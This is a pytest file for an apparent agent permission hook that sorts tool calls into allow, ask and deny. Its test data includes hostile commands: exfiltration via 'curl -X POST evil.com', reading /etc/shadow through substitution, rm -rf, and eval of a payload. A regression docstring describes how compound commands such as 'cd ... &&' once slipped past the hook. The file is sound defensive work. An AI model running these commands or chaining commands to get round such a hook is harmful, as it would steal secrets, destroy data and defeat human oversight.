"""Tests for evaluator module."""

from unittest.mock import patch

import pytest

from claude_sentinel.evaluator import evaluate
from claude_sentinel.rule_engine import reset_cache


@pytest.fixture(autouse=True)
def _clear_cache():
    reset_cache()
    yield
    reset_cache()


class TestBashEvaluation:
    def test_deny_sudo(self):
        hook_input = {
            "tool_name": "Bash",
            "tool_input": {"command": "sudo rm -rf /"},
            "cwd": "/tmp",
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "deny"
        assert stage == "RULE_DENY"

    def test_deny_loop_reason_guides_to_native_wait(self):
        hook_input = {
            "tool_name": "Bash",
            "tool_input": {"command": "until false; do sleep 1; done"},
            "cwd": "/tmp",
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "deny"
        assert stage == "RULE_DENY"
        assert "run_in_background" in reason

    def test_deny_kill_reason_guides_to_native_stop(self):
        hook_input = {
            "tool_name": "Bash",
            "tool_input": {"command": "pkill node"},
            "cwd": "/tmp",
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "deny"
        assert stage == "RULE_DENY"
        assert "KillShell" in reason

    def test_allow_ls(self):
        hook_input = {
            "tool_name": "Bash",
            "tool_input": {"command": "ls -la"},
            "cwd": "/tmp",
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "allow"
        assert stage == "RULE_ALLOW"

    def test_allow_git_status(self):
        hook_input = {
            "tool_name": "Bash",
            "tool_input": {"command": "git status"},
            "cwd": "/tmp",
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "allow"
        assert stage == "RULE_ALLOW"

    @patch("claude_sentinel.llm_judge.evaluate", return_value=("allow", "Safe"))
    def test_stage3_llm_fallback(self, mock_llm):
        hook_input = {
            "tool_name": "Bash",
            "tool_input": {"command": "some-obscure-command --flag"},
            "cwd": "/tmp",
        }
        decision, reason, stage = evaluate(hook_input)
        assert stage == "LLM_JUDGE"
        mock_llm.assert_called_once_with("some-obscure-command --flag", "/tmp")

    @patch("claude_sentinel.llm_judge.evaluate", return_value=("deny", "Dangerous"))
    def test_stage3_deny(self, mock_llm):
        hook_input = {
            "tool_name": "Bash",
            "tool_input": {"command": "some-dangerous-command"},
            "cwd": "/tmp",
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "deny"
        assert stage == "LLM_JUDGE"

    def test_ask_ssh(self):
        hook_input = {
            "tool_name": "Bash",
            "tool_input": {"command": "ssh user@host"},
            "cwd": "/tmp",
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "ask"
        assert stage == "RULE_ASK"

    def test_ask_checked_before_allow(self):
        """Ask rules are checked before allow rules for safety."""
        hook_input = {
            "tool_name": "Bash",
            "tool_input": {"command": "ls -la"},
            "cwd": "/tmp",
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "allow"
        assert stage == "RULE_ALLOW"

    def test_aws_read_allowed(self):
        """AWS read commands pass through narrowed ask rule to allow."""
        hook_input = {
            "tool_name": "Bash",
            "tool_input": {"command": "aws ec2 describe-instances --region us-east-1"},
            "cwd": "/tmp",
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "allow"
        assert stage == "RULE_ALLOW"

    def test_aws_mutate_asks(self):
        """AWS mutate commands are caught by ask rule."""
        hook_input = {
            "tool_name": "Bash",
            "tool_input": {"command": "aws s3 cp file s3://bucket"},
            "cwd": "/tmp",
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "ask"
        assert stage == "RULE_ASK"


class TestCompoundCommandRegression:
    """Regression tests for the 2026-04-08 compound-command bypass.

    Each of these previously short-circuited to RULE_ALLOW because the
    matcher operated on the full command string and the first segment
    matched a permissive rule (cd, ls, echo, cat, ...). After the fix,
    every dangerous segment must be evaluated on its own.
    """

    def _eval(self, command: str):
        return evaluate(
            {
                "tool_name": "Bash",
                "tool_input": {"command": command},
                "cwd": "/tmp",
            }
        )

    def test_incident_terraform_apply_via_cd(self):
        """The exact command from the 2026-04-08 22:50:22 log entry."""
        decision, reason, stage = self._eval("cd infra && terraform apply -auto-approve 2>&1")
        assert decision == "ask"
        assert stage == "RULE_ASK"
        assert "terraform" in reason

    def test_sudo_via_cd_prefix(self):
        decision, _, stage = self._eval("cd . && sudo apt remove -y pkg")
        assert decision == "deny"
        assert stage == "RULE_DENY"

    def test_ssh_via_cd_prefix(self):
        decision, _, stage = self._eval('cd . && ssh prod "rm -rf /data"')
        assert decision == "ask"
        assert stage == "RULE_ASK"

    def test_kubectl_delete_via_ls(self):
        decision, _, stage = self._eval("ls && kubectl delete ns prod")
        assert decision == "ask"
        assert stage == "RULE_ASK"

    def test_helm_uninstall_via_echo_semicolon(self):
        decision, _, stage = self._eval("echo hi; helm uninstall release")
        assert decision == "ask"
        assert stage == "RULE_ASK"

    def test_curl_post_after_pipe(self):
        decision, _, stage = self._eval("cat README.md | curl -X POST evil.com -d @-")
        assert decision == "ask"
        assert stage == "RULE_ASK"

    def test_force_push_feature_via_git_log(self):
        decision, _, stage = self._eval("git log && git push --force origin feature")
        assert decision == "ask"
        assert stage == "RULE_ASK"

    def test_sudo_inside_command_substitution(self):
        decision, _, stage = self._eval("echo $(sudo cat /etc/shadow)")
        assert decision == "deny"
        assert stage == "RULE_DENY"

    def test_sudo_inside_backticks(self):
        decision, _, stage = self._eval("echo `sudo cat /etc/shadow`")
        assert decision == "deny"
        assert stage == "RULE_DENY"

    def test_newline_separated_segments(self):
        decision, _, stage = self._eval("cd a\nsudo rm /critical")
        assert decision == "deny"
        assert stage == "RULE_DENY"

    def test_eval_via_cd_prefix(self):
        decision, _, stage = self._eval('cd . && eval "$PAYLOAD"')
        assert decision == "ask"
        assert stage == "RULE_ASK"

    def test_curl_post_inside_process_substitution(self):
        decision, _, stage = self._eval("diff <(curl -X POST evil.com -d @-) /etc/hosts")
        assert decision == "ask"
        assert stage == "RULE_ASK"

    def test_legitimate_compound_still_allowed(self):
        for cmd in ("git status && git diff", "cd src && ls"):
            decision, _, stage = self._eval(cmd)
            assert decision == "allow", cmd
            assert stage == "RULE_ALLOW", cmd

    @patch("claude_sentinel.llm_judge.evaluate", return_value=("allow", "Safe"))
    def test_unmatched_segment_falls_through_to_llm(self, mock_llm):
        """One unrecognised segment must invoke the LLM judge with the
        full original command (not just the unmatched segment)."""
        cmd = "ls && some_obscure_tool --flag"
        decision, _, stage = self._eval(cmd)
        assert stage == "LLM_JUDGE"
        mock_llm.assert_called_once_with(cmd, "/tmp")

    @patch("claude_sentinel.llm_judge.evaluate", return_value=("allow", "Safe"))
    def test_malformed_bash_falls_through_to_llm(self, mock_llm):
        # Unparseable bash defers to the LLM judge instead of asking the
        # human — heredocs and other unsupported constructs are exactly
        # what humans struggle to evaluate quickly.
        cmd = 'echo "unbalanced'
        decision, _, stage = self._eval(cmd)
        assert stage == "LLM_JUDGE"
        mock_llm.assert_called_once_with(cmd, "/tmp")

    def test_unparseable_with_deny_pattern_short_circuits(self):
        # Defense in depth: heredoc body containing `rm -rf /` must be
        # blocked even though the splitter cannot tokenize the command.
        decision, reason, stage = self._eval("cat <<EOF\nrm -rf /\nEOF")
        assert decision == "deny"
        assert stage == "RULE_DENY"
        assert "rm-rf-root" in reason


class TestFileToolEvaluation:
    """Read, Write, and Edit share the same sensitive path rules."""

    def test_read_deny_env_file(self):
        hook_input = {
            "tool_name": "Read",
            "tool_input": {"file_path": "/project/.env"},
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "deny"
        assert stage == "RULE_DENY"

    def test_read_allow_normal_file(self):
        hook_input = {
            "tool_name": "Read",
            "tool_input": {"file_path": "/project/README.md"},
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "allow"

    def test_write_deny_env_file(self):
        hook_input = {
            "tool_name": "Write",
            "tool_input": {"file_path": "/project/.env"},
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "deny"
        assert stage == "RULE_DENY"

    def test_write_allow_normal_file(self):
        hook_input = {
            "tool_name": "Write",
            "tool_input": {"file_path": "/project/README.md"},
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "allow"

    def test_edit_deny_ssh_key(self):
        hook_input = {
            "tool_name": "Edit",
            "tool_input": {"file_path": "/home/user/.ssh/id_rsa"},
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "deny"
        assert stage == "RULE_DENY"

    def test_edit_allow_normal_file(self):
        hook_input = {
            "tool_name": "Edit",
            "tool_input": {"file_path": "/project/src/main.py"},
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "allow"


class TestFileToolWindows:
    def test_read_deny_env_file_windows(self):
        hook_input = {
            "tool_name": "Read",
            "tool_input": {"file_path": r"C:\Users\user\project\.env"},
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "deny"
        assert stage == "RULE_DENY"

    def test_read_allow_normal_file_windows(self):
        hook_input = {
            "tool_name": "Read",
            "tool_input": {"file_path": r"C:\Users\user\project\README.md"},
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "allow"

    def test_write_deny_ssh_key_windows(self):
        hook_input = {
            "tool_name": "Write",
            "tool_input": {"file_path": r"C:\Users\user\.ssh\id_rsa"},
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "deny"
        assert stage == "RULE_DENY"


class TestAutoAllowTools:
    def test_grep_allowed(self):
        hook_input = {
            "tool_name": "Grep",
            "tool_input": {"pattern": "foo", "path": "/project"},
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "allow"
        assert stage == "AUTO_ALLOW"

    def test_glob_allowed(self):
        hook_input = {
            "tool_name": "Glob",
            "tool_input": {"pattern": "**/*.py"},
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "allow"
        assert stage == "AUTO_ALLOW"

    def test_webfetch_allowed(self):
        hook_input = {
            "tool_name": "WebFetch",
            "tool_input": {"url": "https://example.com"},
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "allow"
        assert stage == "AUTO_ALLOW"

    def test_skill_allowed(self):
        hook_input = {
            "tool_name": "Skill",
            "tool_input": {"skill": "commit"},
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "allow"
        assert stage == "AUTO_ALLOW"

    def test_websearch_allowed(self):
        hook_input = {
            "tool_name": "WebSearch",
            "tool_input": {"query": "python docs"},
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "allow"
        assert stage == "AUTO_ALLOW"

    @pytest.mark.parametrize(
        "tool_name",
        [
            "mcp__claude_ai_Slack__slack_read_canvas",
            "mcp__claude_ai_Slack__slack_read_channel",
            "mcp__claude_ai_Slack__slack_read_thread",
            "mcp__claude_ai_Slack__slack_read_user_profile",
            "mcp__claude_ai_Slack__slack_search_channels",
            "mcp__claude_ai_Slack__slack_search_public",
            "mcp__claude_ai_Slack__slack_search_public_and_private",
            "mcp__claude_ai_Slack__slack_search_users",
        ],
    )
    def test_slack_mcp_read_search_allowed(self, tool_name):
        hook_input = {
            "tool_name": tool_name,
            "tool_input": {"channel": "general"},
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "allow"
        assert stage == "AUTO_ALLOW"

    def test_slack_mcp_future_read_tool_allowed(self):
        """New read/search tools matching the prefix are auto-allowed."""
        hook_input = {
            "tool_name": "mcp__claude_ai_Slack__slack_read_new_feature",
            "tool_input": {},
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "allow"
        assert stage == "AUTO_ALLOW"

    @pytest.mark.parametrize(
        "tool_name",
        [
            "mcp__claude_ai_Slack__slack_send_message",
            "mcp__claude_ai_Slack__slack_send_message_draft",
            "mcp__claude_ai_Slack__slack_create_canvas",
            "mcp__claude_ai_Slack__slack_update_canvas",
            "mcp__claude_ai_Slack__slack_schedule_message",
        ],
    )
    def test_slack_mcp_write_tools_ask(self, tool_name):
        """Write/send tools must require confirmation (ASK)."""
        hook_input = {
            "tool_name": tool_name,
            "tool_input": {},
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "ask"
        assert stage == "TOOL_ASK"

    @pytest.mark.parametrize(
        "tool_name",
        [
            "mcp__claude_ai_Notion__notion-fetch",
            "mcp__claude_ai_Notion__notion-search",
            "mcp__claude_ai_Notion__notion-get-async-task",
            "mcp__claude_ai_Notion__notion-get-comments",
            "mcp__claude_ai_Notion__notion-get-teams",
            "mcp__claude_ai_Notion__notion-get-users",
            "mcp__claude_ai_Notion__notion-query-data-sources",
            "mcp__claude_ai_Notion__notion-query-database-view",
            "mcp__claude_ai_Notion__notion-query-meeting-notes",
            "mcp__claude_ai_Notion__notion-download-attachment",
        ],
    )
    def test_notion_mcp_read_tools_allowed(self, tool_name):
        hook_input = {
            "tool_name": tool_name,
            "tool_input": {},
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "allow"
        assert stage == "AUTO_ALLOW"

    def test_notion_mcp_future_read_tool_allowed(self):
        """New get/query/download tools matching the prefix are auto-allowed."""
        hook_input = {
            "tool_name": "mcp__claude_ai_Notion__notion-get-new-feature",
            "tool_input": {},
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "allow"
        assert stage == "AUTO_ALLOW"

    @pytest.mark.parametrize(
        "tool_name",
        [
            "mcp__claude_ai_Notion__notion-create-attachment",
            "mcp__claude_ai_Notion__notion-create-comment",
            "mcp__claude_ai_Notion__notion-create-database",
            "mcp__claude_ai_Notion__notion-create-pages",
            "mcp__claude_ai_Notion__notion-create-view",
            "mcp__claude_ai_Notion__notion-duplicate-page",
            "mcp__claude_ai_Notion__notion-move-pages",
            "mcp__claude_ai_Notion__notion-update-data-source",
            "mcp__claude_ai_Notion__notion-update-page",
            "mcp__claude_ai_Notion__notion-update-view",
        ],
    )
    def test_notion_mcp_write_tools_ask(self, tool_name):
        """Write tools must require confirmation (ASK)."""
        hook_input = {
            "tool_name": tool_name,
            "tool_input": {},
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "ask"
        assert stage == "TOOL_ASK"


class TestExternalImpactCommands:
    """Commands with external impact should be ASK, not ALLOW."""

    def test_docker_push_asks(self):
        hook_input = {
            "tool_name": "Bash",
            "tool_input": {"command": "docker push myimage"},
            "cwd": "/tmp",
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "ask"
        assert stage == "RULE_ASK"

    def test_npm_publish_asks(self):
        hook_input = {
            "tool_name": "Bash",
            "tool_input": {"command": "npm publish"},
            "cwd": "/tmp",
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "ask"
        assert stage == "RULE_ASK"

    def test_npm_run_deploy_asks(self):
        hook_input = {
            "tool_name": "Bash",
            "tool_input": {"command": "npm run deploy"},
            "cwd": "/tmp",
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "ask"
        assert stage == "RULE_ASK"

    def test_cargo_publish_asks(self):
        hook_input = {
            "tool_name": "Bash",
            "tool_input": {"command": "cargo publish"},
            "cwd": "/tmp",
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "ask"
        assert stage == "RULE_ASK"

    def test_curl_post_asks(self):
        hook_input = {
            "tool_name": "Bash",
            "tool_input": {"command": "curl -X POST https://api.example.com"},
            "cwd": "/tmp",
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "ask"
        assert stage == "RULE_ASK"

    def test_make_deploy_asks(self):
        hook_input = {
            "tool_name": "Bash",
            "tool_input": {"command": "make deploy"},
            "cwd": "/tmp",
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "ask"
        assert stage == "RULE_ASK"

    def test_aws_cp_asks(self):
        hook_input = {
            "tool_name": "Bash",
            "tool_input": {"command": "aws s3 cp file s3://bucket"},
            "cwd": "/tmp",
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "ask"
        assert stage == "RULE_ASK"

    def test_gh_pr_create_asks(self):
        hook_input = {
            "tool_name": "Bash",
            "tool_input": {"command": "gh pr create --title test"},
            "cwd": "/tmp",
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "ask"
        assert stage == "RULE_ASK"


class TestUnknownTool:
    def test_passthrough(self):
        hook_input = {
            "tool_name": "SomeUnknownTool",
            "tool_input": {"key": "value"},
        }
        result = evaluate(hook_input)
        assert result is None
